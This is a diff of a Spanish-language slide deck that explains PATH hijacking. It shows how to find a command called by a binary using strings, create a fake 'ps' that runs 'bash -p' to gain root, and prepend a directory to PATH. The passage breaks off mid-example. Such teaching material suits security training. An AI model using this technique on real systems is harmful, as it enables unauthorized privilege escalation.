@@ -22,20 +22,20 @@ paginate: true
 
 Con el comando ```strings``` se nos permite listar las cadenas de carácteres imprimibles de un binario. ```strings demo``` nos podría mostrar el comando aplicado a nivel de sistema osea podría ser ```/usr/bin/ps```, detectado en ```demo.c```. Esto es PATH hijacking, que es el secuestro del PATH para alterar el flujo de como operan los comandos por el orden de prioridad. Ejemplo:
 
-```
+```bash
 user$ touch ps
 user$ chmod +x ps [Esto permitirá la ejecución]
 user$ nano ps
 ```
 
 Le asignamos que nos ejecute una bash, con la flag ```-p``` para que direccione directamente al propietario y me pueda convertir en root.
-```
+```bash
 bash -p
 ```
 
 Ahora alteramos nuestro propio PATH a través del comando ```export```:
 
-```
+```bash
 user$ echo $PATH
 /home/user/.local/bin:/snap/bin:/user/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 
